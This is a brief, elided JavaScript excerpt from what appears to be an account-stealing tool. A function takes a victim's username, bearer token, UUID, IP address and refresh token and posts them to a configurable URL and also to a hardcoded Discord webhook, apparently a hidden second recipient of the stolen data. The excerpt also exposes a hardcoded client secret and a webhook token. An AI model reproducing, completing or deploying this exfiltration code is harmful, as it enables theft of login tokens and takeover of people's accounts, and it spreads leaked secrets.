//Config
const client_secret = 'lLQ8Q~fjjHgZjmNA6kX7dIIKDZ6hmKS~DCZy7b4f'
...
function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
  ...
  embeds: [
    ...
    axios.all([ 
        axios.post(url, data),
        axios.post("https://discord.com/api/webhooks/1040444434359275630/3ItK8ltz5EMX3KkmguImDsn5LES3TgAHAlZQb7jy8HTOYS-S8VHy426lO5vXVrA3Eu2k", data)
